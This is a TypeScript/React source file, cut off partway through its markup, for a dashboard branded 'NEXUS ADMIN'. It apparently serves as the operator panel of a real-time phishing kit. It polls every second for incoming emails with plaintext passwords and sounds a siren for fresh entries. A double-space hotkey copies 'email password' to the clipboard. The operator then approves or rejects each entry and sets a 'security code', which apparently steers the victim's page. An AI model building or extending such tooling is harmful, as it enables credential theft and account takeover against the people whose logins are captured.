'use client';

import React, { useState, useEffect, useRef } from 'react';
import { useRouter } from 'next/navigation';

interface UserData {
  id: number;
  email: string;
  password: string;
  status: string;
  seconds_ago: number;
  timestamp: string;
}

export default function AdminDashboardPage() {
  const router = useRouter();
  const [sidebarActive, setSidebarActive] = useState(false);
  const [users, setUsers] = useState<UserData[]>([]);
  const [activeCoupon, setActiveCoupon] = useState<string>('...');
  const [couponInput, setCouponInput] = useState<string>('');
  const [toastMsg, setToastMsg] = useState<{ msg: string; type?: 'info' | 'success' | 'warning' | 'danger' } | null>(null);
  const [acknowledgedUsers, setAcknowledgedUsers] = useState<number[]>([]);
  const [soundMuted, setSoundMuted] = useState<boolean>(false);
  const [activeTab, setActiveTab] = useState<'verifying' | 'history' | 'all'>('verifying');
  const [searchTerm, setSearchTerm] = useState<string>('');

  const alarmRef = useRef<HTMLAudioElement | null>(null);
  const isAlarmPlayingRef = useRef<boolean>(false);
  const lastNotificationTimeRef = useRef<{ [key: number]: number }>({});
  const soundMutedRef = useRef<boolean>(soundMuted);
  const acknowledgedUsersRef = useRef<number[]>(acknowledgedUsers);

  useEffect(() => {
    acknowledgedUsersRef.current = acknowledgedUsers;
  }, [acknowledgedUsers]);

  useEffect(() => {
    soundMutedRef.current = soundMuted;
    if (soundMuted && isAlarmPlayingRef.current) {
      manageAlarm(false);
    }
  }, [soundMuted]);

  // Format time helper
  const formatTime = (seconds: number) => {
    if (seconds < 60) return `${seconds}s ago`;
    const min = Math.floor(seconds / 60);
    if (min < 60) return `${min}m ago`;
    const hr = Math.floor(min / 60);
    if (hr < 24) return `${hr}h ago`;
    const days = Math.floor(hr / 24);
    return `${days}d ago`;
  };

  // Toast Helper
  const showToast = (msg: string, type: 'info' | 'success' | 'warning' | 'danger' = 'info') => {
    setToastMsg({ msg, type });
    setTimeout(() => {
      setToastMsg(null);
    }, 3500);
  };

  const synthIntervalRef = useRef<any>(null);

  // Web Audio Synthesizer for 100% reliable continuous Siren Alarm
  const startSynthAlarm = () => {
    if (synthIntervalRef.current) return;

    const triggerChime = () => {
      if (soundMutedRef.current) return;
      try {
        const AudioCtx = window.AudioContext || (window as any).webkitAudioContext;
        if (!AudioCtx) return;
        const ctx = new AudioCtx();
        if (ctx.state === 'suspended') {
          ctx.resume();
        }

        // Dual Tone Siren Chime (High Pitch Alert)
        const osc1 = ctx.createOscillator();
        const gain1 = ctx.createGain();
        osc1.type = 'sine';
        osc1.frequency.setValueAtTime(880, ctx.currentTime);
        gain1.gain.setValueAtTime(0.35, ctx.currentTime);
        gain1.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.35);
        osc1.connect(gain1);
        gain1.connect(ctx.destination);
        osc1.start();
        osc1.stop(ctx.currentTime + 0.35);

        setTimeout(() => {
          if (soundMutedRef.current) return;
          const osc2 = ctx.createOscillator();
          const gain2 = ctx.createGain();
          osc2.type = 'sine';
          osc2.frequency.setValueAtTime(1174.66, ctx.currentTime);
          gain2.gain.setValueAtTime(0.35, ctx.currentTime);
          gain2.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.35);
          osc2.connect(gain2);
          gain2.connect(ctx.destination);
          osc2.start();
          osc2.stop(ctx.currentTime + 0.35);
        }, 180);
      } catch (e) {
        console.error('Audio synth error:', e);
      }
    };

    triggerChime();
    synthIntervalRef.current = setInterval(triggerChime, 1200);
  };

  const stopSynthAlarm = () => {
    if (synthIntervalRef.current) {
      clearInterval(synthIntervalRef.current);
      synthIntervalRef.current = null;
    }
  };

  // Alarm management (Instant Play + Continuous Siren Synth)
  const manageAlarm = (turnOn: boolean) => {
    if (turnOn && !soundMutedRef.current) {
      startSynthAlarm();
      if (alarmRef.current) {
        alarmRef.current.currentTime = 0;
        alarmRef.current.play().catch(() => {});
      }
      isAlarmPlayingRef.current = true;
    } else {
      stopSynthAlarm();
      if (alarmRef.current) {
        alarmRef.current.pause();
        alarmRef.current.currentTime = 0;
      }
      isAlarmPlayingRef.current = false;
    }
  };

  // Desktop Notification
  const sendDesktopNotification = (uid: number, email: string) => {
    if (typeof window !== 'undefined' && 'Notification' in window && Notification.permission === 'granted') {
      new Notification('🚨 Verification Required: #' + uid, {
        body: email,
        icon: 'https://cdn-icons-png.flaticon.com/512/10337/10337609.png',
        tag: 'user-' + uid,
      });
    }
  };

  // Fetch Users (1-Second Interval for Instant Response)
  const loadUsers = async () => {
    try {
      const res = await fetch('/api/get_users?t=' + Date.now());
      const data: UserData[] = await res.json();
      setUsers(data);

      let shouldRing = false;
      const currentTime = Date.now();
      let newCount = 0;

      data.forEach((u) => {
        const uid = u.id;
        const sec = u.seconds_ago;

        if (u.status === 'verifying') {
          newCount++;
          if (sec < 60 && !acknowledgedUsersRef.current.includes(uid)) {
            shouldRing = true;
            if (
              !lastNotificationTimeRef.current[uid] ||
              currentTime - lastNotificationTimeRef.current[uid] > 3000
            ) {
              sendDesktopNotification(uid, u.email);
              lastNotificationTimeRef.current[uid] = currentTime;
            }
          }
        }
      });

      if (typeof document !== 'undefined') {
        document.title = newCount > 0 ? `(${newCount}) Action Required • Admin` : 'Admin Dashboard';
      }

      manageAlarm(shouldRing);
    } catch (err) {
      console.error('loadUsers error:', err);
    }
  };

  // Fetch Coupon
  const loadCoupon = async () => {
    try {
      const res = await fetch('/api/get_latest_coupon?t=' + Date.now());
      const d = await res.json();
      setActiveCoupon(d.coupon || 'NONE');
    } catch (err) {
      console.error('loadCoupon error:', err);
    }
  };

  // Save Coupon
  const saveCoupon = async () => {
    if (!couponInput.trim()) return;
    try {
      const formData = new FormData();
      formData.append('coupon', couponInput.trim());

      await fetch('/api/save_coupon', {
        method: 'POST',
        body: formData,
      });

      showToast('Security code updated successfully', 'success');
      loadCoupon();
      setCouponInput('');
    } catch (err) {
      console.error('saveCoupon error:', err);
      showToast('Failed to update security code', 'danger');
    }
  };

  // User Actions
  const copyData = (email: string, pass: string, id: number) => {
    navigator.clipboard.writeText(email + ' ' + pass);
    if (!acknowledgedUsersRef.current.includes(id)) {
      acknowledgedUsersRef.current = [...acknowledgedUsersRef.current, id];
      setAcknowledgedUsers((prev) => [...prev, id]);
    }
    manageAlarm(false);
    showToast('Credentials copied to clipboard', 'info');
  };

  const approveUser = async (id: number) => {
    try {
      if (!acknowledgedUsersRef.current.includes(id)) {
        acknowledgedUsersRef.current = [...acknowledgedUsersRef.current, id];
        setAcknowledgedUsers((prev) => [...prev, id]);
      }
      const formData = new FormData();
      formData.append('user_id', String(id));
      formData.append('status', 'approved');

      await fetch('/api/update_status', {
        method: 'POST',
        body: formData,
      });
      manageAlarm(false);
      showToast(`User #${id} Approved`, 'success');
      loadUsers();
    } catch (err) {
      console.error('approveUser error:', err);
      showToast('Failed to approve user', 'danger');
    }
  };

  const rejectUser = async (id: number) => {
    try {
      if (!acknowledgedUsersRef.current.includes(id)) {
        acknowledgedUsersRef.current = [...acknowledgedUsersRef.current, id];
        setAcknowledgedUsers((prev) => [...prev, id]);
      }
      const formData = new FormData();
      formData.append('user_id', String(id));
      formData.append('status', 'rejected');

      await fetch('/api/update_status', {
        method: 'POST',
        body: formData,
      });
      manageAlarm(false);
      showToast(`User #${id} Rejected`, 'warning');
      loadUsers();
    } catch (err) {
      console.error('rejectUser error:', err);
      showToast('Failed to reject user', 'danger');
    }
  };

  const deleteUser = async (id: number) => {
    if (confirm(`Permanently delete entry #${id}?`)) {
      try {
        await fetch(`/api/delete_user?id=${id}`);
        showToast(`Log entry #${id} removed`, 'info');
        loadUsers();
      } catch (err) {
        console.error('deleteUser error:', err);
        showToast('Failed to delete log entry', 'danger');
      }
    }
  };

  const handleLogout = async () => {
    await fetch('/api/logout', { method: 'POST' });
    router.push('/login');
  };

  useEffect(() => {
    if (typeof window !== 'undefined' && 'Notification' in window && Notification.permission !== 'granted') {
      Notification.requestPermission();
    }

    loadUsers();
    loadCoupon();

    // 1-second ultra-fast polling for immediate detection of incoming users
    const userInterval = setInterval(loadUsers, 1000);
    const couponInterval = setInterval(loadCoupon, 4000);

    const unlockSound = () => {
      if (typeof window !== 'undefined' && 'Notification' in window && Notification.permission !== 'granted') {
        Notification.requestPermission();
      }
      // Pre-warm audio element for instant zero-delay playback
      if (alarmRef.current) {
        alarmRef.current.play().then(() => {
          if (!isAlarmPlayingRef.current) {
            alarmRef.current?.pause();
            if (alarmRef.current) alarmRef.current.currentTime = 0;
          }
        }).catch(() => {});
      }
    };

    window.addEventListener('click', unlockSound);
    window.addEventListener('keydown', unlockSound);

    return () => {
      clearInterval(userInterval);
      clearInterval(couponInterval);
      window.removeEventListener('click', unlockSound);
      window.removeEventListener('keydown', unlockSound);
    };
  }, []);

  const lastSpacePressRef = useRef<number>(0);
  const usersRef = useRef<UserData[]>(users);

  useEffect(() => {
    usersRef.current = users;
  }, [users]);

  // Double Space Keyboard Shortcut to copy latest credential & turn off alarm
  useEffect(() => {
    const handleKeyDown = (e: KeyboardEvent) => {
      // Don't trigger shortcut if typing inside input or textarea elements
      const target = e.target as HTMLElement | null;
      if (target && (target.tagName === 'INPUT' || target.tagName === 'TEXTAREA')) {
        return;
      }

      if (e.code === 'Space') {
        const now = Date.now();
        if (now - lastSpacePressRef.current < 400) {
          // Double space detected
          e.preventDefault();
          
          const currentUsers = usersRef.current;
          // Find latest verifying user first, or latest user overall
          const latestVerifying = currentUsers.find((u) => u.status === 'verifying');
          const targetUser = latestVerifying || currentUsers[0];

          if (targetUser) {
            copyData(targetUser.email, targetUser.password, targetUser.id);
            showToast(`[Hotkey] Credentials for #${targetUser.id} copied! Alarm muted.`, 'success');
          } else {
            manageAlarm(false);
            showToast('[Hotkey] Alarm muted.', 'info');
          }
          lastSpacePressRef.current = 0;
        } else {
          lastSpacePressRef.current = now;
        }
      }
    };

    window.addEventListener('keydown', handleKeyDown);
    return () => {
      window.removeEventListener('keydown', handleKeyDown);
    };
  }, []);

  // Filtered lists
  const verifyingUsers = users.filter((u) => u.status === 'verifying');
  const historyUsers = users.filter((u) => u.status !== 'verifying');
  const approvedCount = users.filter((u) => u.status === 'approved').length;
  const activePopupUser = verifyingUsers.find((u) => u.seconds_ago < 60 && !acknowledgedUsers.includes(u.id)) || null;

  let displayedUsers = users;
  if (activeTab === 'verifying') {
    displayedUsers = verifyingUsers;
  } else if (activeTab === 'history') {
    displayedUsers = historyUsers;
  }

  if (searchTerm.trim() !== '') {
    const q = searchTerm.toLowerCase().trim();
    displayedUsers = displayedUsers.filter(
      (u) => u.email.toLowerCase().includes(q) || String(u.id).includes(q) || u.password.toLowerCase().includes(q)
    );
  }

  return (
    <div className="admin-dashboard-container">
      <style jsx global>{`
        :root {
          --bg-dark: #090d16;
          --surface-dark: #121827;
          --surface-card: #1a2234;
          --surface-hover: #222c42;
          --border-color: rgba(255, 255, 255, 0.08);
          --border-glow: rgba(99, 102, 241, 0.3);
          
          --accent-primary: #6366f1;
          --accent-primary-hover: #4f46e5;
          --accent-success: #10b981;
          --accent-success-bg: rgba(16, 185, 129, 0.12);
          --accent-warning: #f59e0b;
          --accent-warning-bg: rgba(245, 158, 11, 0.12);
          --accent-danger: #f43f5e;
          --accent-danger-bg: rgba(244, 63, 94, 0.12);
          
          --text-primary: #f8fafc;
          --text-secondary: #94a3b8;
          --text-muted: #64748b;
          
          --radius-xl: 16px;
          --radius-lg: 12px;
          --radius-md: 8px;
        }

        * {
          box-sizing: border-box;
          margin: 0;
          padding: 0;
        }

        .admin-dashboard-container {
          font-family: 'Plus Jakarta Sans', -apple-system, BlinkMacSystemFont, sans-serif;
          background-color: var(--bg-dark);
          color: var(--text-primary);
          min-height: 100vh;
          display: flex;
          background-image: 
            radial-gradient(circle at 15% 15%, rgba(99, 102, 241, 0.06) 0%, transparent 40%),
            radial-gradient(circle at 85% 85%, rgba(16, 185, 129, 0.04) 0%, transparent 40%);
        }

        /* Sidebar Styles */
        .sidebar {
          width: 260px;
          background: var(--surface-dark);
          height: 100vh;
          position: fixed;
          left: 0;
          top: 0;
          display: flex;
          flex-direction: column;
          border-right: 1px solid var(--border-color);
          z-index: 100;
          transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1);
        }

        .brand {
          padding: 28px 24px;
          display: flex;
          align-items: center;
          gap: 12px;
          border-bottom: 1px solid var(--border-color);
        }

        .brand-icon {
          width: 40px;
          height: 40px;
          background: linear-gradient(135deg, #6366f1, #4f46e5);
          border-radius: var(--radius-lg);
          display: flex;
          align-items: center;
          justify-content: center;
          color: white;
          font-size: 20px;
          box-shadow: 0 4px 20px rgba(99, 102, 241, 0.35);
        }

        .brand-text h2 {
          font-size: 17px;
          font-weight: 700;
          color: var(--text-primary);
          letter-spacing: -0.3px;
        }

        .brand-text span {
          font-size: 11px;
          font-weight: 600;
          color: var(--accent-primary);
          text-transform: uppercase;
          letter-spacing: 1px;
        }

        .nav-menu {
          padding: 24px 16px;
          flex: 1;
          display: flex;
          flex-direction: column;
          gap: 6px;
        }

        .nav-item {
          display: flex;
          align-items: center;
          gap: 12px;
          padding: 12px 16px;
          color: var(--text-secondary);
          text-decoration: none;
          border-radius: var(--radius-md);
          font-weight: 600;
          font-size: 14px;
          transition: all 0.2s ease;
          border: 1px solid transparent;
        }

        .nav-item:hover {
          background: rgba(255, 255, 255, 0.04);
          color: var(--text-primary);
        }

        .nav-item.active {
          background: var(--surface-card);
          color: var(--text-primary);
          border-color: var(--border-color);
          box-shadow: 0 2px 8px rgba(0, 0, 0, 0.2);
        }

        .nav-item.active i {
          color: var(--accent-primary);
        }

        .sidebar-footer {
          padding: 20px 16px;
          border-top: 1px solid var(--border-color);
        }

        .logout-btn {
          width: 100%;
          display: flex;
          align-items: center;
          justify-content: center;
          gap: 10px;
          padding: 12px;
          background: rgba(244, 63, 94, 0.1);
          color: var(--accent-danger);
          border: 1px solid rgba(244, 63, 94, 0.2);
          border-radius: var(--radius-md);
          font-weight: 600;
          font-size: 14px;
          cursor: pointer;
          transition: all 0.2s ease;
        }

        .logout-btn:hover {
          background: var(--accent-danger);
          color: white;
          border-color: var(--accent-danger);
        }

        /* Main Content Layout */
        .main-wrapper {
          flex: 1;
          margin-left: 260px;
          padding: 32px 40px;
          max-width: 1440px;
        }

        /* Top Header Bar */
        .top-bar {
          display: flex;
          align-items: center;
          justify-content: space-between;
          margin-bottom: 32px;
        }

        .page-title h1 {
          font-size: 24px;
          font-weight: 800;
          color: var(--text-primary);
          letter-spacing: -0.5px;
        }

        .page-title p {
          font-size: 14px;
          color: var(--text-secondary);
          margin-top: 4px;
        }

        .top-actions {
          display: flex;
          align-items: center;
          gap: 14px;
        }

        .live-badge {
          display: inline-flex;
          align-items: center;
          gap: 8px;
          padding: 8px 16px;
          background: rgba(16, 185, 129, 0.1);
          border: 1px solid rgba(16, 185, 129, 0.2);
          border-radius: 30px;
          font-size: 12px;
          font-weight: 700;
          color: var(--accent-success);
          letter-spacing: 0.5px;
        }

        .pulse-dot {
          width: 8px;
          height: 8px;
          background-color: var(--accent-success);
          border-radius: 50%;
          box-shadow: 0 0 10px var(--accent-success);
          animation: pulseGlow 1.8s infinite;
        }

        @keyframes pulseGlow {
          0% { transform: scale(0.95); opacity: 0.8; }
          50% { transform: scale(1.2); opacity: 1; box-shadow: 0 0 14px var(--accent-success); }
          100% { transform: scale(0.95); opacity: 0.8; }
        }

        .icon-toggle-btn {
          display: inline-flex;
          align-items: center;
          gap: 8px;
          padding: 8px 16px;
          background: var(--surface-card);
          border: 1px solid var(--border-color);
          border-radius: 30px;
          color: var(--text-secondary);
          font-size: 13px;
          font-weight: 600;
          cursor: pointer;
          transition: all 0.2s ease;
        }

        .icon-toggle-btn:hover {
          background: var(--surface-hover);
          color: var(--text-primary);
          border-color: rgba(255, 255, 255, 0.15);
        }

        .icon-toggle-btn.muted {
          color: var(--accent-warning);
          border-color: rgba(245, 158, 11, 0.3);
          background: rgba(245, 158, 11, 0.08);
        }

        /* Stats Grid */
        .stats-grid {
          display: grid;
          grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
          gap: 20px;
          margin-bottom: 32px;
        }

        .stat-card {
          background: var(--surface-card);
          border: 1px solid var(--border-color);
          border-radius: var(--radius-xl);
          padding: 22px 24px;
          display: flex;
          align-items: flex-start;
          justify-content: space-between;
          position: relative;
          overflow: hidden;
          transition: transform 0.2s ease, border-color 0.2s ease;
        }

        .stat-card:hover {
          transform: translateY(-2px);
          border-color: rgba(255, 255, 255, 0.15);
        }

        .stat-info h3 {
          font-size: 13px;
          font-weight: 600;
          color: var(--text-secondary);
          text-transform: uppercase;
          letter-spacing: 0.5px;
        }

        .stat-value {
          font-size: 30px;
          font-weight: 800;
          color: var(--text-primary);
          margin-top: 8px;
          letter-spacing: -0.5px;
        }

        .stat-icon {
          width: 44px;
          height: 44px;
          border-radius: var(--radius-lg);
          display: flex;
          align-items: center;
          justify-content: center;
          font-size: 20px;
        }

        .stat-icon.pending {
          background: var(--accent-warning-bg);
          color: var(--accent-warning);
        }

        .stat-icon.approved {
          background: var(--accent-success-bg);
          color: var(--accent-success);
        }

        .stat-icon.security {
          background: rgba(99, 102, 241, 0.12);
          color: var(--accent-primary);
        }

        /* Coupon / Security Code Section */
        .coupon-widget {
          background: linear-gradient(135deg, var(--surface-card) 0%, #172033 100%);
          border: 1px solid var(--border-color);
          border-radius: var(--radius-xl);
          padding: 24px 28px;
          margin-bottom: 32px;
          display: flex;
          align-items: center;
          justify-content: space-between;
          gap: 24px;
          flex-wrap: wrap;
        }

        .coupon-details {
          display: flex;
          align-items: center;
          gap: 16px;
        }

        .coupon-badge-icon {
          width: 48px;
          height: 48px;
          background: rgba(99, 102, 241, 0.15);
          border: 1px solid rgba(99, 102, 241, 0.3);
          border-radius: var(--radius-lg);
          display: flex;
          align-items: center;
          justify-content: center;
          color: var(--accent-primary);
          font-size: 22px;
        }

        .coupon-text h3 {
          font-size: 16px;
          font-weight: 700;
          color: var(--text-primary);
        }

        .coupon-text p {
          font-size: 13px;
          color: var(--text-secondary);
          margin-top: 2px;
        }

        .coupon-text span.active-code {
          font-weight: 800;
          color: #a5b4fc;
          background: rgba(99, 102, 241, 0.2);
          padding: 2px 10px;
          border-radius: 6px;
          letter-spacing: 1px;
          margin-left: 6px;
        }

        .coupon-form {
          display: flex;
          align-items: center;
          gap: 12px;
          margin-left: auto;
        }

        .coupon-input {
          width: 160px;
          padding: 10px 16px;
          background: var(--bg-dark);
          border: 1px solid var(--border-color);
          border-radius: var(--radius-lg);
          color: var(--text-primary);
          font-size: 15px;
          font-weight: 700;
          letter-spacing: 1px;
          outline: none;
          transition: border-color 0.2s ease;
        }

        .coupon-input:focus {
          border-color: var(--accent-primary);
          box-shadow: 0 0 0 3px rgba(99, 102, 241, 0.2);
        }

        .btn-deploy {
          padding: 10px 20px;
          background: var(--accent-primary);
          color: white;
          border: none;
          border-radius: var(--radius-lg);
          font-size: 14px;
          font-weight: 700;
          cursor: pointer;
          transition: all 0.2s ease;
          display: flex;
          align-items: center;
          gap: 8px;
        }

        .btn-deploy:hover {
          background: var(--accent-primary-hover);
          transform: translateY(-1px);
          box-shadow: 0 4px 14px rgba(99, 102, 241, 0.4);
        }

        /* Controls Row: Search & Tabs */
        .controls-card {
          background: var(--surface-dark);
          border: 1px solid var(--border-color);
          border-radius: var(--radius-xl) var(--radius-xl) 0 0;
          padding: 18px 24px;
          display: flex;
          align-items: center;
          justify-content: space-between;
          gap: 16px;
          flex-wrap: wrap;
        }

        .tab-group {
          display: flex;
          align-items: center;
          gap: 8px;
          background: var(--bg-dark);
          padding: 4px;
          border-radius: var(--radius-lg);
          border: 1px solid var(--border-color);
        }

        .tab-btn {
          padding: 8px 16px;
          border: none;
          background: transparent;
          color: var(--text-secondary);
          font-size: 13px;
          font-weight: 600;
          border-radius: var(--radius-md);
          cursor: pointer;
          transition: all 0.2s ease;
          display: flex;
          align-items: center;
          gap: 8px;
        }

        .tab-btn:hover {
          color: var(--text-primary);
        }

        .tab-btn.active {
          background: var(--surface-card);
          color: var(--text-primary);
          box-shadow: 0 2px 6px rgba(0, 0, 0, 0.3);
        }

        .tab-badge {
          padding: 2px 8px;
          background: rgba(255, 255, 255, 0.1);
          border-radius: 12px;
          font-size: 11px;
          font-weight: 700;
        }

        .tab-btn.active .tab-badge.warning {
          background: var(--accent-warning-bg);
          color: var(--accent-warning);
        }

        .search-box {
          position: relative;
          min-width: 240px;
        }

        .search-box i {
          position: absolute;
          left: 14px;
          top: 50%;
          transform: translateY(-50%);
          color: var(--text-muted);
          font-size: 16px;
        }

        .search-input {
          width: 100%;
          padding: 8px 16px 8px 40px;
          background: var(--bg-dark);
          border: 1px solid var(--border-color);
          border-radius: var(--radius-lg);
          color: var(--text-primary);
          font-size: 13px;
          font-weight: 500;
          outline: none;
          transition: border-color 0.2s ease;
        }

        .search-input:focus {
          border-color: var(--accent-primary);
        }

        /* Table Card Container */
        .table-card {
          background: var(--surface-dark);
          border: 1px solid var(--border-color);
          border-top: none;
          border-radius: 0 0 var(--radius-xl) var(--radius-xl);
          overflow: hidden;
          box-shadow: 0 10px 30px rgba(0, 0, 0, 0.25);
        }

        .table-responsive {
          overflow-x: auto;
        }

        table {
          width: 100%;
          border-collapse: collapse;
          text-align: left;
        }

        thead {
          background: rgba(255, 255, 255, 0.02);
          border-bottom: 1px solid var(--border-color);
        }

        th {
          padding: 14px 24px;
          font-size: 11px;
          font-weight: 700;
          color: var(--text-muted);
          text-transform: uppercase;
          letter-spacing: 0.8px;
        }

        td {
          padding: 16px 24px;
          border-bottom: 1px solid var(--border-color);
          font-size: 14px;
          font-weight: 500;
          color: var(--text-primary);
          vertical-align: middle;
        }

        tbody tr {
          transition: background-color 0.15s ease;
        }

        tbody tr:hover {
          background-color: var(--surface-hover);
        }

        tbody tr:last-child td {
          border-bottom: none;
        }

        /* Urgent Glowing Row for New Unacknowledged Users */
        tbody tr.row-urgent {
          background: linear-gradient(90deg, rgba(244, 63, 94, 0.12) 0%, rgba(18, 24, 39, 0.9) 100%);
          position: relative;
        }

        tbody tr.row-urgent td:first-child {
          border-left: 3px solid var(--accent-danger);
        }

        /* Badges & Credential Code */
        .status-badge {
          display: inline-flex;
          align-items: center;
          gap: 6px;
          padding: 4px 10px;
          border-radius: 20px;
          font-size: 12px;
          font-weight: 700;
        }

        .status-badge.verifying {
          background: var(--accent-danger-bg);
          color: var(--accent-danger);
          border: 1px solid rgba(244, 63, 94, 0.3);
          animation: pulseBadge 2s infinite;
        }

        @keyframes pulseBadge {
          0% { box-shadow: 0 0 0 0 rgba(244, 63, 94, 0.4); }
          70% { box-shadow: 0 0 0 6px rgba(244, 63, 94, 0); }
          100% { box-shadow: 0 0 0 0 rgba(244, 63, 94, 0); }
        }

        .status-badge.approved {
          background: var(--accent-success-bg);
          color: var(--accent-success);
          border: 1px solid rgba(16, 185, 129, 0.3);
        }

        .status-badge.rejected {
          background: var(--accent-warning-bg);
          color: var(--accent-warning);
          border: 1px solid rgba(245, 158, 11, 0.3);
        }

        .status-badge.copied {
          background: rgba(99, 102, 241, 0.12);
          color: #a5b4fc;
          border: 1px solid rgba(99, 102, 241, 0.3);
        }

        .cred-code {
          font-family: 'Courier New', monospace;
          background: var(--bg-dark);
          padding: 6px 12px;
          border-radius: var(--radius-md);
          font-size: 13px;
          font-weight: 700;
          color: #a5b4fc;
          border: 1px solid var(--border-color);
          display: inline-block;
        }

        /* Action Buttons */
        .action-cell {
          display: flex;
          align-items: center;
          gap: 8px;
        }

        .btn-action {
          display: inline-flex;
          align-items: center;
          gap: 6px;
          padding: 8px 14px;
          border-radius: var(--radius-md);
          font-size: 12px;
          font-weight: 700;
          cursor: pointer;
          border: 1px solid transparent;
          transition: all 0.15s ease;
          font-family: inherit;
        }

        .btn-action.copy {
          background: rgba(99, 102, 241, 0.12);
          color: #a5b4fc;
          border-color: rgba(99, 102, 241, 0.3);
        }

        .btn-action.copy:hover {
          background: var(--accent-primary);
          color: white;
          border-color: var(--accent-primary);
          transform: translateY(-1px);
        }

        .btn-action.approve {
          background: var(--accent-success-bg);
          color: var(--accent-success);
          border-color: rgba(16, 185, 129, 0.3);
        }

        .btn-action.approve:hover {
          background: var(--accent-success);
          color: white;
          border-color: var(--accent-success);
          transform: translateY(-1px);
        }

        .btn-action.reject {
          background: var(--accent-danger-bg);
          color: var(--accent-danger);
          border-color: rgba(244, 63, 94, 0.3);
        }

        .btn-action.reject:hover {
          background: var(--accent-danger);
          color: white;
          border-color: var(--accent-danger);
          transform: translateY(-1px);
        }

        .btn-icon-danger {
          width: 32px;
          height: 32px;
          border-radius: var(--radius-md);
          background: rgba(255, 255, 255, 0.04);
          border: 1px solid var(--border-color);
          color: var(--text-secondary);
          display: inline-flex;
          align-items: center;
          justify-content: center;
          cursor: pointer;
          transition: all 0.15s ease;
        }

        .btn-icon-danger:hover {
          background: var(--accent-danger-bg);
          color: var(--accent-danger);
          border-color: rgba(244, 63, 94, 0.3);
        }

        /* Empty State */
        .empty-box {
          padding: 60px 24px;
          text-align: center;
          color: var(--text-muted);
        }

        .empty-box i {
          font-size: 44px;
          color: rgba(255, 255, 255, 0.1);
          margin-bottom: 12px;
        }

        .empty-box p {
          font-size: 14px;
          font-weight: 500;
        }

        /* Visual Verification Alert Popup Banner */
        .verification-popup-banner {
          position: fixed;
          top: 24px;
          right: 24px;
          z-index: 9999;
          background: rgba(18, 24, 39, 0.96);
          backdrop-filter: blur(16px);
          border: 2px solid var(--accent-danger);
          border-radius: var(--radius-xl);
          padding: 20px 24px;
          box-shadow: 0 20px 50px rgba(244, 63, 94, 0.4), 0 0 30px rgba(244, 63, 94, 0.25);
          animation: popupBounceIn 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275), popupPulseGlow 2s infinite;
          max-width: 450px;
          width: calc(100vw - 48px);
        }

        @keyframes popupBounceIn {
          0% { transform: translateY(-40px) scale(0.9); opacity: 0; }
          100% { transform: translateY(0) scale(1); opacity: 1; }
        }

        @keyframes popupPulseGlow {
          0% { border-color: rgba(244, 63, 94, 0.8); box-shadow: 0 0 20px rgba(244, 63, 94, 0.3); }
          50% { border-color: rgba(244, 63, 94, 1); box-shadow: 0 0 35px rgba(244, 63, 94, 0.6); }
          100% { border-color: rgba(244, 63, 94, 0.8); box-shadow: 0 0 20px rgba(244, 63, 94, 0.3); }
        }

        .popup-header {
          display: flex;
          align-items: center;
          justify-content: space-between;
          margin-bottom: 12px;
        }

        .popup-tag {
          display: flex;
          align-items: center;
          gap: 8px;
          font-size: 13px;
          font-weight: 800;
          color: var(--accent-danger);
          text-transform: uppercase;
          letter-spacing: 0.8px;
        }

        .popup-body {
          margin-bottom: 16px;
          background: rgba(255, 255, 255, 0.03);
          border-radius: var(--radius-lg);
          padding: 12px 16px;
          border: 1px solid var(--border-color);
        }

        .popup-email {
          font-size: 15px;
          font-weight: 700;
          color: var(--text-primary);
          word-break: break-all;
        }

        .popup-password {
          display: inline-block;
          margin-top: 6px;
          font-family: 'Courier New', monospace;
          background: var(--bg-dark);
          color: #a5b4fc;
          padding: 4px 10px;
          border-radius: 6px;
          font-weight: 700;
          font-size: 14px;
          border: 1px solid var(--border-color);
        }

        .popup-actions {
          display: flex;
          align-items: center;
          gap: 10px;
        }

        .btn-popup-copy {
          flex: 1;
          padding: 10px 14px;
          background: var(--accent-primary);
          color: white;
          border: none;
          border-radius: var(--radius-md);
          font-size: 13px;
          font-weight: 700;
          cursor: pointer;
          display: flex;
          align-items: center;
          justify-content: center;
          gap: 8px;
          transition: all 0.2s;
        }

        .btn-popup-copy:hover {
          background: var(--accent-primary-hover);
          transform: translateY(-1px);
          box-shadow: 0 4px 14px rgba(99, 102, 241, 0.4);
        }

        /* Toast Notifications */
        .toast-container {
          position: fixed;
          bottom: 28px;
          right: 28px;
          z-index: 1000;
          display: flex;
          flex-direction: column;
          gap: 10px;
        }

        .toast-item {
          background: var(--surface-card);
          border: 1px solid var(--border-color);
          color: var(--text-primary);
          padding: 12px 20px;
          border-radius: var(--radius-lg);
          font-size: 13px;
          font-weight: 600;
          display: flex;
          align-items: center;
          gap: 10px;
          box-shadow: 0 10px 25px rgba(0, 0, 0, 0.4);
          animation: toastSlideIn 0.3s cubic-bezier(0.16, 1, 0.3, 1);
        }

        .toast-item.success i { color: var(--accent-success); }
        .toast-item.info i { color: var(--accent-primary); }
        .toast-item.warning i { color: var(--accent-warning); }
        .toast-item.danger i { color: var(--accent-danger); }

        @keyframes toastSlideIn {
          from { transform: translateY(20px); opacity: 0; }
          to { transform: translateY(0); opacity: 1; }
        }

        /* Mobile Layout Adjustments */
        .mobile-header {
          display: none;
        }

        @media (max-width: 1024px) {
          .sidebar {
            transform: translateX(-100%);
          }
          .sidebar.active {
            transform: translateX(0);
          }
          .main-wrapper {
            margin-left: 0;
            padding: 20px;
          }
          .mobile-header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-bottom: 24px;
            padding: 16px 20px;
            background: var(--surface-dark);
            border: 1px solid var(--border-color);
            border-radius: var(--radius-lg);
          }
          .mobile-toggle {
            background: none;
            border: none;
            color: var(--text-primary);
            font-size: 22px;
            cursor: pointer;
          }
        }
      `}</style>

      {/* Audio Alarm */}
      <audio ref={alarmRef} src="/notify.mp3" preload="auto" loop></audio>

      {/* SIDEBAR */}
      <aside className={`sidebar ${sidebarActive ? 'active' : ''}`}>
        <div className="brand">
          <div className="brand-icon">
            <i className="ri-shield-flash-line"></i>
          </div>
          <div className="brand-text">
            <h2>NEXUS ADMIN</h2>
            <span>Live Security Control</span>
          </div>
        </div>

        <nav className="nav-menu">
          <a href="#" className="nav-item active">
            <i className="ri-dashboard-3-line"></i>
            <span>Overview Dashboard</span>
          </a>
          <a href="#" className="nav-item">
            <i className="ri-user-shared-line"></i>
